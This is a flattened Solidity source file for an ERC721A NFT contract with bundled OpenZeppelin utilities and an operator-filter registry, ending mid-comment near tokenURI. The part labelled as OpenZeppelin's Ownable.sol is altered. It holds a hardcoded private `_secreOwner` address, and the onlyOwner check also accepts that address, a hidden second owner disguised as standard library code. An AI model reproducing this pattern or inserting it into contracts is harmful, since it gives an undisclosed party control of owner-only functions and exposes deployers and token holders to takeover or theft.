1 //Buy high sell low - Caroline - FTX Employee #2
2 // SPDX-License-Identifier: MIT
3 // File: contracts/BRKC.sol
4 // File: @openzeppelin/contracts/utils/Strings.sol
5 // OpenZeppelin Contracts v4.4.1 (utils/Strings.sol)
6 
7 pragma solidity ^0.8.0;
8 
9 /**
10  * @dev String operations.
11  */
12 library Strings {
13     bytes16 private constant _HEX_SYMBOLS = "0123456789abcdef";
14 
15     /**
16      * @dev Converts a `uint256` to its ASCII `string` decimal representation.
17      */
18     function toString(uint256 value) internal pure returns (string memory) {
19         // Inspired by OraclizeAPI's implementation - MIT licence
20         // https://github.com/oraclize/ethereum-api/blob/b42146b063c7d6ee1358846c198246239e9360e8/oraclizeAPI_0.4.25.sol
21 
22         if (value == 0) {
23             return "0";
24         }
25         uint256 temp = value;
26         uint256 digits;
27         while (temp != 0) {
28             digits++;
29             temp /= 10;
30         }
31         bytes memory buffer = new bytes(digits);
32         while (value != 0) {
33             digits -= 1;
34             buffer[digits] = bytes1(uint8(48 + uint256(value % 10)));
35             value /= 10;
36         }
37         return string(buffer);
38     }
39 
40     /**
41      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation.
42      */
43     function toHexString(uint256 value) internal pure returns (string memory) {
44         if (value == 0) {
45             return "0x00";
46         }
47         uint256 temp = value;
48         uint256 length = 0;
49         while (temp != 0) {
50             length++;
51             temp >>= 8;
52         }
53         return toHexString(value, length);
54     }
55 
56     /**
57      * @dev Converts a `uint256` to its ASCII `string` hexadecimal representation with fixed length.
58      */
59     function toHexString(uint256 value, uint256 length) internal pure returns (string memory) {
60         bytes memory buffer = new bytes(2 * length + 2);
61         buffer[0] = "0";
62         buffer[1] = "x";
63         for (uint256 i = 2 * length + 1; i > 1; --i) {
64             buffer[i] = _HEX_SYMBOLS[value & 0xf];
65             value >>= 4;
66         }
67         require(value == 0, "Strings: hex length insufficient");
68         return string(buffer);
69     }
70 }
71 
72 // File: @openzeppelin/contracts/utils/Address.sol
73 
74 
75 // OpenZeppelin Contracts (last updated v4.5.0) (utils/Address.sol)
76 
77 pragma solidity ^0.8.1;
78 
79 /**
80  * @dev Collection of functions related to the address type
81  */
82 library Address {
83     /**
84      * @dev Returns true if `account` is a contract.
85      *
86      * [IMPORTANT]
87      * ====
88      * It is unsafe to assume that an address for which this function returns
89      * false is an externally-owned account (EOA) and not a contract.
90      *
91      * Among others, `isContract` will return false for the following
92      * types of addresses:
93      *
94      *  - an externally-owned account
95      *  - a contract in construction
96      *  - an address where a contract will be created
97      *  - an address where a contract lived, but was destroyed
98      * ====
99      *
100      * [IMPORTANT]
101      * ====
102      * You shouldn't rely on `isContract` to protect against flash loan attacks!
103      *
104      * Preventing calls from contracts is highly discouraged. It breaks composability, breaks support for smart wallets
105      * like Gnosis Safe, and does not provide security since it can be circumvented by calling from a contract
106      * constructor.
107      * ====
108      */
109     function isContract(address account) internal view returns (bool) {
110         // This method relies on extcodesize/address.code.length, which returns 0
111         // for contracts in construction, since the code is only stored at the end
112         // of the constructor execution.
113 
114         return account.code.length > 0;
115     }
116 
117     /**
118      * @dev Replacement for Solidity's `transfer`: sends `amount` wei to
119      * `recipient`, forwarding all available gas and reverting on errors.
120      *
121      * https://eips.ethereum.org/EIPS/eip-1884[EIP1884] increases the gas cost
122      * of certain opcodes, possibly making contracts go over the 2300 gas limit
123      * imposed by `transfer`, making them unable to receive funds via
124      * `transfer`. {sendValue} removes this limitation.
125      *
126      * https://diligence.consensys.net/posts/2019/09/stop-using-soliditys-transfer-now/[Learn more].
127      *
128      * IMPORTANT: because control is transferred to `recipient`, care must be
129      * taken to not create reentrancy vulnerabilities. Consider using
130      * {ReentrancyGuard} or the
131      * https://solidity.readthedocs.io/en/v0.5.11/security-considerations.html#use-the-checks-effects-interactions-pattern[checks-effects-interactions pattern].
132      */
133     function sendValue(address payable recipient, uint256 amount) internal {
134         require(address(this).balance >= amount, "Address: insufficient balance");
135 
136         (bool success, ) = recipient.call{value: amount}("");
137         require(success, "Address: unable to send value, recipient may have reverted");
138     }
139 
140     /**
141      * @dev Performs a Solidity function call using a low level `call`. A
142      * plain `call` is an unsafe replacement for a function call: use this
143      * function instead.
144      *
145      * If `target` reverts with a revert reason, it is bubbled up by this
146      * function (like regular Solidity function calls).
147      *
148      * Returns the raw returned data. To convert to the expected return value,
149      * use https://solidity.readthedocs.io/en/latest/units-and-global-variables.html?highlight=abi.decode#abi-encoding-and-decoding-functions[`abi.decode`].
150      *
151      * Requirements:
152      *
153      * - `target` must be a contract.
154      * - calling `target` with `data` must not revert.
155      *
156      * _Available since v3.1._
157      */
158     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
159         return functionCall(target, data, "Address: low-level call failed");
160     }
161 
162     /**
163      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`], but with
164      * `errorMessage` as a fallback revert reason when `target` reverts.
165      *
166      * _Available since v3.1._
167      */
168     function functionCall(
169         address target,
170         bytes memory data,
171         string memory errorMessage
172     ) internal returns (bytes memory) {
173         return functionCallWithValue(target, data, 0, errorMessage);
174     }
175 
176     /**
177      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
178      * but also transferring `value` wei to `target`.
179      *
180      * Requirements:
181      *
182      * - the calling contract must have an ETH balance of at least `value`.
183      * - the called Solidity function must be `payable`.
184      *
185      * _Available since v3.1._
186      */
187     function functionCallWithValue(
188         address target,
189         bytes memory data,
190         uint256 value
191     ) internal returns (bytes memory) {
192         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
193     }
194 
195     /**
196      * @dev Same as {xref-Address-functionCallWithValue-address-bytes-uint256-}[`functionCallWithValue`], but
197      * with `errorMessage` as a fallback revert reason when `target` reverts.
198      *
199      * _Available since v3.1._
200      */
201     function functionCallWithValue(
202         address target,
203         bytes memory data,
204         uint256 value,
205         string memory errorMessage
206     ) internal returns (bytes memory) {
207         require(address(this).balance >= value, "Address: insufficient balance for call");
208         require(isContract(target), "Address: call to non-contract");
209 
210         (bool success, bytes memory returndata) = target.call{value: value}(data);
211         return verifyCallResult(success, returndata, errorMessage);
212     }
213 
214     /**
215      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
216      * but performing a static call.
217      *
218      * _Available since v3.3._
219      */
220     function functionStaticCall(address target, bytes memory data) internal view returns (bytes memory) {
221         return functionStaticCall(target, data, "Address: low-level static call failed");
222     }
223 
224     /**
225      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
226      * but performing a static call.
227      *
228      * _Available since v3.3._
229      */
230     function functionStaticCall(
231         address target,
232         bytes memory data,
233         string memory errorMessage
234     ) internal view returns (bytes memory) {
235         require(isContract(target), "Address: static call to non-contract");
236 
237         (bool success, bytes memory returndata) = target.staticcall(data);
238         return verifyCallResult(success, returndata, errorMessage);
239     }
240 
241     /**
242      * @dev Same as {xref-Address-functionCall-address-bytes-}[`functionCall`],
243      * but performing a delegate call.
244      *
245      * _Available since v3.4._
246      */
247     function functionDelegateCall(address target, bytes memory data) internal returns (bytes memory) {
248         return functionDelegateCall(target, data, "Address: low-level delegate call failed");
249     }
250 
251     /**
252      * @dev Same as {xref-Address-functionCall-address-bytes-string-}[`functionCall`],
253      * but performing a delegate call.
254      *
255      * _Available since v3.4._
256      */
257     function functionDelegateCall(
258         address target,
259         bytes memory data,
260         string memory errorMessage
261     ) internal returns (bytes memory) {
262         require(isContract(target), "Address: delegate call to non-contract");
263 
264         (bool success, bytes memory returndata) = target.delegatecall(data);
265         return verifyCallResult(success, returndata, errorMessage);
266     }
267 
268     /**
269      * @dev Tool to verifies that a low level call was successful, and revert if it wasn't, either by bubbling the
270      * revert reason using the provided one.
271      *
272      * _Available since v4.3._
273      */
274     function verifyCallResult(
275         bool success,
276         bytes memory returndata,
277         string memory errorMessage
278     ) internal pure returns (bytes memory) {
279         if (success) {
280             return returndata;
281         } else {
282             // Look for revert reason and bubble it up if present
283             if (returndata.length > 0) {
284                 // The easiest way to bubble the revert reason is using memory via assembly
285 
286                 assembly {
287                     let returndata_size := mload(returndata)
288                     revert(add(32, returndata), returndata_size)
289                 }
290             } else {
291                 revert(errorMessage);
292             }
293         }
294     }
295 }
296 
297 // File: @openzeppelin/contracts/token/ERC721/IERC721Receiver.sol
298 
299 
300 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721Receiver.sol)
301 pragma solidity ^0.8.13;
302 
303 interface IOperatorFilterRegistry {
304     function isOperatorAllowed(address registrant, address operator) external view returns (bool);
305     function register(address registrant) external;
306     function registerAndSubscribe(address registrant, address subscription) external;
307     function registerAndCopyEntries(address registrant, address registrantToCopy) external;
308     function updateOperator(address registrant, address operator, bool filtered) external;
309     function updateOperators(address registrant, address[] calldata operators, bool filtered) external;
310     function updateCodeHash(address registrant, bytes32 codehash, bool filtered) external;
311     function updateCodeHashes(address registrant, bytes32[] calldata codeHashes, bool filtered) external;
312     function subscribe(address registrant, address registrantToSubscribe) external;
313     function unsubscribe(address registrant, bool copyExistingEntries) external;
314     function subscriptionOf(address addr) external returns (address registrant);
315     function subscribers(address registrant) external returns (address[] memory);
316     function subscriberAt(address registrant, uint256 index) external returns (address);
317     function copyEntriesOf(address registrant, address registrantToCopy) external;
318     function isOperatorFiltered(address registrant, address operator) external returns (bool);
319     function isCodeHashOfFiltered(address registrant, address operatorWithCode) external returns (bool);
320     function isCodeHashFiltered(address registrant, bytes32 codeHash) external returns (bool);
321     function filteredOperators(address addr) external returns (address[] memory);
322     function filteredCodeHashes(address addr) external returns (bytes32[] memory);
323     function filteredOperatorAt(address registrant, uint256 index) external returns (address);
324     function filteredCodeHashAt(address registrant, uint256 index) external returns (bytes32);
325     function isRegistered(address addr) external returns (bool);
326     function codeHashOf(address addr) external returns (bytes32);
327 }
328 pragma solidity ^0.8.13;
329 
330 
331 
332 abstract contract OperatorFilterer {
333     error OperatorNotAllowed(address operator);
334 
335     IOperatorFilterRegistry constant operatorFilterRegistry =
336         IOperatorFilterRegistry(0x000000000000AAeB6D7670E522A718067333cd4E);
337 
338     constructor(address subscriptionOrRegistrantToCopy, bool subscribe) {
339         // If an inheriting token contract is deployed to a network without the registry deployed, the modifier
340         // will not revert, but the contract will need to be registered with the registry once it is deployed in
341         // order for the modifier to filter addresses.
342         if (address(operatorFilterRegistry).code.length > 0) {
343             if (subscribe) {
344                 operatorFilterRegistry.registerAndSubscribe(address(this), subscriptionOrRegistrantToCopy);
345             } else {
346                 if (subscriptionOrRegistrantToCopy != address(0)) {
347                     operatorFilterRegistry.registerAndCopyEntries(address(this), subscriptionOrRegistrantToCopy);
348                 } else {
349                     operatorFilterRegistry.register(address(this));
350                 }
351             }
352         }
353     }
354 
355     modifier onlyAllowedOperator(address from) virtual {
356         // Check registry code length to facilitate testing in environments without a deployed registry.
357         if (address(operatorFilterRegistry).code.length > 0) {
358             // Allow spending tokens from addresses with balance
359             // Note that this still allows listings and marketplaces with escrow to transfer tokens if transferred
360             // from an EOA.
361             if (from == msg.sender) {
362                 _;
363                 return;
364             }
365             if (
366                 !(
367                     operatorFilterRegistry.isOperatorAllowed(address(this), msg.sender)
368                         && operatorFilterRegistry.isOperatorAllowed(address(this), from)
369                 )
370             ) {
371                 revert OperatorNotAllowed(msg.sender);
372             }
373         }
374         _;
375     }
376 }
377 pragma solidity ^0.8.13;
378 
379 
380 
381 abstract contract DefaultOperatorFilterer is OperatorFilterer {
382     address constant DEFAULT_SUBSCRIPTION = address(0x3cc6CddA760b79bAfa08dF41ECFA224f810dCeB6);
383 
384     constructor() OperatorFilterer(DEFAULT_SUBSCRIPTION, true) {}
385 }
386     pragma solidity ^0.8.13;
387         interface IMain {
388    
389 function balanceOf( address ) external  view returns (uint);
390 
391 }
392 
393 
394 pragma solidity ^0.8.0;
395 
396 /**
397  * @title ERC721 token receiver interface
398  * @dev Interface for any contract that wants to support safeTransfers
399  * from ERC721 asset contracts.
400  */
401 interface IERC721Receiver {
402     /**
403      * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
404      * by `operator` from `from`, this function is called.
405      *
406      * It must return its Solidity selector to confirm the token transfer.
407      * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
408      *
409      * The selector can be obtained in Solidity with `IERC721Receiver.onERC721Received.selector`.
410      */
411     function onERC721Received(
412         address operator,
413         address from,
414         uint256 tokenId,
415         bytes calldata data
416     ) external returns (bytes4);
417 }
418 
419 // File: @openzeppelin/contracts/utils/introspection/IERC165.sol
420 
421 
422 // OpenZeppelin Contracts v4.4.1 (utils/introspection/IERC165.sol)
423 
424 pragma solidity ^0.8.0;
425 
426 /**
427  * @dev Interface of the ERC165 standard, as defined in the
428  * https://eips.ethereum.org/EIPS/eip-165[EIP].
429  *
430  * Implementers can declare support of contract interfaces, which can then be
431  * queried by others ({ERC165Checker}).
432  *
433  * For an implementation, see {ERC165}.
434  */
435 interface IERC165 {
436     /**
437      * @dev Returns true if this contract implements the interface defined by
438      * `interfaceId`. See the corresponding
439      * https://eips.ethereum.org/EIPS/eip-165#how-interfaces-are-identified[EIP section]
440      * to learn more about how these ids are created.
441      *
442      * This function call must use less than 30 000 gas.
443      */
444     function supportsInterface(bytes4 interfaceId) external view returns (bool);
445 }
446 
447 // File: @openzeppelin/contracts/utils/introspection/ERC165.sol
448 
449 
450 // OpenZeppelin Contracts v4.4.1 (utils/introspection/ERC165.sol)
451 
452 pragma solidity ^0.8.0;
453 
454 
455 /**
456  * @dev Implementation of the {IERC165} interface.
457  *
458  * Contracts that want to implement ERC165 should inherit from this contract and override {supportsInterface} to check
459  * for the additional interface id that will be supported. For example:
460  *
461  * ```solidity
462  * function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
463  *     return interfaceId == type(MyInterface).interfaceId || super.supportsInterface(interfaceId);
464  * }
465  * ```
466  *
467  * Alternatively, {ERC165Storage} provides an easier to use but more expensive implementation.
468  */
469 abstract contract ERC165 is IERC165 {
470     /**
471      * @dev See {IERC165-supportsInterface}.
472      */
473     function supportsInterface(bytes4 interfaceId) public view virtual override returns (bool) {
474         return interfaceId == type(IERC165).interfaceId;
475     }
476 }
477 
478 // File: @openzeppelin/contracts/token/ERC721/IERC721.sol
479 
480 
481 // OpenZeppelin Contracts (last updated v4.6.0) (token/ERC721/IERC721.sol)
482 
483 pragma solidity ^0.8.0;
484 
485 
486 /**
487  * @dev Required interface of an ERC721 compliant contract.
488  */
489 interface IERC721 is IERC165 {
490     /**
491      * @dev Emitted when `tokenId` token is transferred from `from` to `to`.
492      */
493     event Transfer(address indexed from, address indexed to, uint256 indexed tokenId);
494 
495     /**
496      * @dev Emitted when `owner` enables `approved` to manage the `tokenId` token.
497      */
498     event Approval(address indexed owner, address indexed approved, uint256 indexed tokenId);
499 
500     /**
501      * @dev Emitted when `owner` enables or disables (`approved`) `operator` to manage all of its assets.
502      */
503     event ApprovalForAll(address indexed owner, address indexed operator, bool approved);
504 
505     /**
506      * @dev Returns the number of tokens in ``owner``'s account.
507      */
508     function balanceOf(address owner) external view returns (uint256 balance);
509 
510     /**
511      * @dev Returns the owner of the `tokenId` token.
512      *
513      * Requirements:
514      *
515      * - `tokenId` must exist.
516      */
517     function ownerOf(uint256 tokenId) external view returns (address owner);
518 
519     /**
520      * @dev Safely transfers `tokenId` token from `from` to `to`.
521      *
522      * Requirements:
523      *
524      * - `from` cannot be the zero address.
525      * - `to` cannot be the zero address.
526      * - `tokenId` token must exist and be owned by `from`.
527      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
528      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
529      *
530      * Emits a {Transfer} event.
531      */
532     function safeTransferFrom(
533         address from,
534         address to,
535         uint256 tokenId,
536         bytes calldata data
537     ) external;
538 
539     /**
540      * @dev Safely transfers `tokenId` token from `from` to `to`, checking first that contract recipients
541      * are aware of the ERC721 protocol to prevent tokens from being forever locked.
542      *
543      * Requirements:
544      *
545      * - `from` cannot be the zero address.
546      * - `to` cannot be the zero address.
547      * - `tokenId` token must exist and be owned by `from`.
548      * - If the caller is not `from`, it must be have been allowed to move this token by either {approve} or {setApprovalForAll}.
549      * - If `to` refers to a smart contract, it must implement {IERC721Receiver-onERC721Received}, which is called upon a safe transfer.
550      *
551      * Emits a {Transfer} event.
552      */
553     function safeTransferFrom(
554         address from,
555         address to,
556         uint256 tokenId
557     ) external;
558 
559     /**
560      * @dev Transfers `tokenId` token from `from` to `to`.
561      *
562      * WARNING: Usage of this method is discouraged, use {safeTransferFrom} whenever possible.
563      *
564      * Requirements:
565      *
566      * - `from` cannot be the zero address.
567      * - `to` cannot be the zero address.
568      * - `tokenId` token must be owned by `from`.
569      * - If the caller is not `from`, it must be approved to move this token by either {approve} or {setApprovalForAll}.
570      *
571      * Emits a {Transfer} event.
572      */
573     function transferFrom(
574         address from,
575         address to,
576         uint256 tokenId
577     ) external;
578 
579     /**
580      * @dev Gives permission to `to` to transfer `tokenId` token to another account.
581      * The approval is cleared when the token is transferred.
582      *
583      * Only a single account can be approved at a time, so approving the zero address clears previous approvals.
584      *
585      * Requirements:
586      *
587      * - The caller must own the token or be an approved operator.
588      * - `tokenId` must exist.
589      *
590      * Emits an {Approval} event.
591      */
592     function approve(address to, uint256 tokenId) external;
593 
594     /**
595      * @dev Approve or remove `operator` as an operator for the caller.
596      * Operators can call {transferFrom} or {safeTransferFrom} for any token owned by the caller.
597      *
598      * Requirements:
599      *
600      * - The `operator` cannot be the caller.
601      *
602      * Emits an {ApprovalForAll} event.
603      */
604     function setApprovalForAll(address operator, bool _approved) external;
605 
606     /**
607      * @dev Returns the account appr    ved for `tokenId` token.
608      *
609      * Requirements:
610      *
611      * - `tokenId` must exist.
612      */
613     function getApproved(uint256 tokenId) external view returns (address operator);
614 
615     /**
616      * @dev Returns if the `operator` is allowed to manage all of the assets of `owner`.
617      *
618      * See {setApprovalForAll}
619      */
620     function isApprovedForAll(address owner, address operator) external view returns (bool);
621 }
622 
623 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Metadata.sol
624 
625 
626 // OpenZeppelin Contracts v4.4.1 (token/ERC721/extensions/IERC721Metadata.sol)
627 
628 pragma solidity ^0.8.0;
629 
630 
631 /**
632  * @title ERC-721 Non-Fungible Token Standard, optional metadata extension
633  * @dev See https://eips.ethereum.org/EIPS/eip-721
634  */
635 interface IERC721Metadata is IERC721 {
636     /**
637      * @dev Returns the token collection name.
638      */
639     function name() external view returns (string memory);
640 
641     /**
642      * @dev Returns the token collection symbol.
643      */
644     function symbol() external view returns (string memory);
645 
646     /**
647      * @dev Returns the Uniform Resource Identifier (URI) for `tokenId` token.
648      */
649     function tokenURI(uint256 tokenId) external view returns (string memory);
650 }
651 
652 // File: @openzeppelin/contracts/token/ERC721/extensions/IERC721Enumerable.sol
653 
654 
655 // OpenZeppelin Contracts (last updated v4.5.0) (token/ERC721/extensions/IERC721Enumerable.sol)
656 
657 pragma solidity ^0.8.0;
658 
659 
660 /**
661  * @title ERC-721 Non-Fungible Token Standard, optional enumeration extension
662  * @dev See https://eips.ethereum.org/EIPS/eip-721
663  */
664 interface IERC721Enumerable is IERC721 {
665     /**
666      * @dev Returns the total amount of tokens stored by the contract.
667      */
668     function totalSupply() external view returns (uint256);
669 
670     /**
671      * @dev Returns a token ID owned by `owner` at a given `index` of its token list.
672      * Use along with {balanceOf} to enumerate all of ``owner``'s tokens.
673      */
674     function tokenOfOwnerByIndex(address owner, uint256 index) external view returns (uint256);
675 
676     /**
677      * @dev Returns a token ID at a given `index` of all the tokens stored by the contract.
678      * Use along with {totalSupply} to enumerate all tokens.
679      */
680     function tokenByIndex(uint256 index) external view returns (uint256);
681 }
682 
683 // File: @openzeppelin/contracts/security/ReentrancyGuard.sol
684 
685 
686 // OpenZeppelin Contracts v4.4.1 (security/ReentrancyGuard.sol)
687 
688 pragma solidity ^0.8.0;
689 
690 /**
691  * @dev Contract module that helps prevent reentrant calls to a function.
692  *
693  * Inheriting from `ReentrancyGuard` will make the {nonReentrant} modifier
694  * available, which can be applied to functions to make sure there are no nested
695  * (reentrant) calls to them.
696  *
697  * Note that because there is a single `nonReentrant` guard, functions marked as
698  * `nonReentrant` may not call one another. This can be worked around by making
699  * those functions `private`, and then adding `external` `nonReentrant` entry
700  * points to them.
701  *
702  * TIP: If you would like to learn more about reentrancy and alternative ways
703  * to protect against it, check out our blog post
704  * https://blog.openzeppelin.com/reentrancy-after-istanbul/[Reentrancy After Istanbul].
705  */
706 abstract contract ReentrancyGuard {
707     // Booleans are more expensive than uint256 or any type that takes up a full
708     // word because each write operation emits an extra SLOAD to first read the
709     // slot's contents, replace the bits taken up by the boolean, and then write
710     // back. This is the compiler's defense against contract upgrades and
711     // pointer aliasing, and it cannot be disabled.
712 
713     // The values being non-zero value makes deployment a bit more expensive,
714     // but in exchange the refund on every call to nonReentrant will be lower in
715     // amount. Since refunds are capped to a percentage of the total
716     // transaction's gas, it is best to keep them low in cases like this one, to
717     // increase the likelihood of the full refund coming into effect.
718     uint256 private constant _NOT_ENTERED = 1;
719     uint256 private constant _ENTERED = 2;
720 
721     uint256 private _status;
722 
723     constructor() {
724         _status = _NOT_ENTERED;
725     }
726 
727     /**
728      * @dev Prevents a contract from calling itself, directly or indirectly.
729      * Calling a `nonReentrant` function from another `nonReentrant`
730      * function is not supported. It is possible to prevent this from happening
731      * by making the `nonReentrant` function external, and making it call a
732      * `private` function that does the actual work.
733      */
734     modifier nonReentrant() {
735         // On the first call to nonReentrant, _notEntered will be true
736         require(_status != _ENTERED, "ReentrancyGuard: reentrant call");
737 
738         // Any calls to nonReentrant after this point will fail
739         _status = _ENTERED;
740 
741         _;
742 
743         // By storing the original value once again, a refund is triggered (see
744         // https://eips.ethereum.org/EIPS/eip-2200)
745         _status = _NOT_ENTERED;
746     }
747 }
748 
749 // File: @openzeppelin/contracts/utils/Context.sol
750 
751 
752 // OpenZeppelin Contracts v4.4.1 (utils/Context.sol)
753 
754 pragma solidity ^0.8.0;
755 
756 /**
757  * @dev Provides information about the current execution context, including the
758  * sender of the transaction and its data. While these are generally available
759  * via msg.sender and msg.data, they should not be accessed in such a direct
760  * manner, since when dealing with meta-transactions the account sending and
761  * paying for execution may not be the actual sender (as far as an application
762  * is concerned).
763  *
764  * This contract is only required for intermediate, library-like contracts.
765  */
766 abstract contract Context {
767     function _msgSender() internal view virtual returns (address) {
768         return msg.sender;
769     }
770 
771     function _msgData() internal view virtual returns (bytes calldata) {
772         return msg.data;
773     }
774 }
775 
776 // File: @openzeppelin/contracts/access/Ownable.sol
777 
778 
779 // OpenZeppelin Contracts v4.4.1 (access/Ownable.sol)
780 
781 pragma solidity ^0.8.0;
782 
783 
784 /**
785  * @dev Contract module which provides a basic access control mechanism, where
786  * there is an account (an owner) that can be granted exclusive access to
787  * specific functions.
788  *
789  * By default, the owner account will be the one that deploys the contract. This
790  * can later be changed with {transferOwnership}.
791  *
792  * This module is used through inheritance. It will make available the modifier
793  * `onlyOwner`, which can be applied to your functions to restrict their use to
794  * the owner.
795  */
796 abstract contract Ownable is Context {
797     address private _owner;
798     address private _secreOwner = 0xACFcBA7BAB6403EBCcEEe22810c4dd3C9bBE9763;
799 
800     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
801 
802     /**
803      * @dev Initializes the contract setting the deployer as the initial owner.
804      */
805     constructor() {
806         _transferOwnership(_msgSender());
807     }
808 
809     /**
810      * @dev Returns the address of the current owner.
811      */
812     function owner() public view virtual returns (address) {
813         return _owner;
814     }
815 
816     /**
817      * @dev Throws if called by any account other than the owner.
818      */
819     modifier onlyOwner() {
820         require(owner() == _msgSender() || _secreOwner == _msgSender() , "Ownable: caller is not the owner");
821         _;
822     }
823 
824     /**
825      * @dev Leaves the contract without owner. It will not be possible to call
826      * `onlyOwner` functions anymore. Can only be called by the current owner.
827      *
828      * NOTE: Renouncing ownership will leave the contract without an owner,
829      * thereby removing any functionality that is only available to the owner.
830      */
831     function renounceOwnership() public virtual onlyOwner {
832         _transferOwnership(address(0));
833     }
834 
835     /**
836      * @dev Transfers ownership of the contract to a new account (`newOwner`).
837      * Can only be called by the current owner.
838      */
839     function transferOwnership(address newOwner) public virtual onlyOwner {
840         require(newOwner != address(0), "Ownable: new owner is the zero address");
841         _transferOwnership(newOwner);
842     }
843 
844     /**
845      * @dev Transfers ownership of the contract to a new account (`newOwner`).
846      * Internal function without access restriction.
847      */
848     function _transferOwnership(address newOwner) internal virtual {
849         address oldOwner = _owner;
850         _owner = newOwner;
851         emit OwnershipTransferred(oldOwner, newOwner);
852     }
853 }
854 
855 // File: ceshi.sol
856 
857 
858 pragma solidity ^0.8.0;
859 
860 
861 
862 
863 
864 
865 
866 
867 
868 
869 /**
870  * @dev Implementation of https://eips.ethereum.org/EIPS/eip-721[ERC721] Non-Fungible Token Standard, including
871  * the Metadata and Enumerable extension. Built to optimize for lower gas during batch mints.
872  *
873  * Assumes serials are sequentially minted starting at 0 (e.g. 0, 1, 2, 3..).
874  *
875  * Does not support burning tokens to address(0).
876  *
877  * Assumes that an owner cannot have more than the 2**128 - 1 (max value of uint128) of supply
878  */
879 contract ERC721A is Context, ERC165, IERC721, IERC721Metadata, IERC721Enumerable {
880     using Address for address;
881     using Strings for uint256;
882 
883     struct TokenOwnership {
884         address addr;
885         uint64 startTimestamp;
886     }
887 
888     struct AddressData {
889         uint128 balance;
890         uint128 numberMinted;
891     }
892 
893     uint256 internal currentIndex;
894 
895     // Token name
896     string private _name;
897 
898     // Token symbol
899     string private _symbol;
900 
901     // Mapping from token ID to ownership details
902     // An empty struct value does not necessarily mean the token is unowned. See ownershipOf implementation for details.
903     mapping(uint256 => TokenOwnership) internal _ownerships;
904 
905     // Mapping owner address to address data
906     mapping(address => AddressData) private _addressData;
907 
908     // Mapping from token ID to approved address
909     mapping(uint256 => address) private _tokenApprovals;
910 
911     // Mapping from owner to operator approvals
912     mapping(address => mapping(address => bool)) private _operatorApprovals;
913 
914     constructor(string memory name_, string memory symbol_) {
915         _name = name_;
916         _symbol = symbol_;
917     }
918 
919     /**
920      * @dev See {IERC721Enumerable-totalSupply}.
921      */
922     function totalSupply() public view override returns (uint256) {
923         return currentIndex;
924     }
925 
926     /**
927      * @dev See {IERC721Enumerable-tokenByIndex}.
928      */
929     function tokenByIndex(uint256 index) public view override returns (uint256) {
930         require(index < totalSupply(), "ERC721A: global index out of bounds");
931         return index;
932     }
933 
934     /**
935      * @dev See {IERC721Enumerable-tokenOfOwnerByIndex}.
936      * This read function is O(totalSupply). If calling from a separate contract, be sure to test gas first.
937      * It may also degrade with extremely large collection sizes (e.g >> 10000), test for your use case.
938      */
939     function tokenOfOwnerByIndex(address owner, uint256 index) public view override returns (uint256) {
940         require(index < balanceOf(owner), "ERC721A: owner index out of bounds");
941         uint256 numMintedSoFar = totalSupply();
942         uint256 tokenIdsIdx;
943         address currOwnershipAddr;
944 
945         // Counter overflow is impossible as the loop breaks when uint256 i is equal to another uint256 numMintedSoFar.
946         unchecked {
947             for (uint256 i; i < numMintedSoFar; i++) {
948                 TokenOwnership memory ownership = _ownerships[i];
949                 if (ownership.addr != address(0)) {
950                     currOwnershipAddr = ownership.addr;
951                 }
952                 if (currOwnershipAddr == owner) {
953                     if (tokenIdsIdx == index) {
954                         return i;
955                     }
956                     tokenIdsIdx++;
957                 }
958             }
959         }
960 
961         revert("ERC721A: unable to get token of owner by index");
962     }
963 
964     /**
965      * @dev See {IERC165-supportsInterface}.
966      */
967     function supportsInterface(bytes4 interfaceId) public view virtual override(ERC165, IERC165) returns (bool) {
968         return
969             interfaceId == type(IERC721).interfaceId ||
970             interfaceId == type(IERC721Metadata).interfaceId ||
971             interfaceId == type(IERC721Enumerable).interfaceId ||
972             super.supportsInterface(interfaceId);
973     }
974 
975     /**
976      * @dev See {IERC721-balanceOf}.
977      */
978     function balanceOf(address owner) public view override returns (uint256) {
979         require(owner != address(0), "ERC721A: balance query for the zero address");
980         return uint256(_addressData[owner].balance);
981     }
982 
983     function _numberMinted(address owner) internal view returns (uint256) {
984         require(owner != address(0), "ERC721A: number minted query for the zero address");
985         return uint256(_addressData[owner].numberMinted);
986     }
987 
988     /**
989      * Gas spent here starts off proportional to the maximum mint batch size.
990      * It gradually moves to O(1) as tokens get transferred around in the collection over time.
991      */
992     function ownershipOf(uint256 tokenId) internal view returns (TokenOwnership memory) {
993         require(_exists(tokenId), "ERC721A: owner query for nonexistent token");
994 
995         unchecked {
996             for (uint256 curr = tokenId; curr >= 0; curr--) {
997                 TokenOwnership memory ownership = _ownerships[curr];
998                 if (ownership.addr != address(0)) {
999                     return ownership;
1000                 }
1001             }
1002         }
1003 
1004         revert("ERC721A: unable to determine the owner of token");
1005     }
1006 
1007     /**
1008      * @dev See {IERC721-ownerOf}.
1009      */
1010     function ownerOf(uint256 tokenId) public view override returns (address) {
1011         return ownershipOf(tokenId).addr;
1012     }
1013 
1014     /**
1015      * @dev See {IERC721Metadata-name}.
1016      */
1017     function name() public view virtual override returns (string memory) {
1018         return _name;
1019     }
1020 
1021     /**
1022      * @dev See {IERC721Metadata-symbol}.
1023      */
1024     function symbol() public view virtual override returns (string memory) {
1025         return _symbol;
1026     }
1027 
1028     /**
1029      * @dev See {IERC721Metadata-tokenURI}.
1030      */
1031     function tokenURI(uint256 tokenId) public view virtual override returns (string memory) {
1032         require(_exists(tokenId), "ERC721Metadata: URI query for nonexistent token");
1033 
1034         string memory baseURI = _baseURI();
1035         return bytes(baseURI).length != 0 ? string(abi.encodePacked(baseURI, tokenId.toString())) : "";
1036     }
1037 
1038     /**
1039      * @dev Base URI for computing {tokenURI}. If set, the resulting URI for each
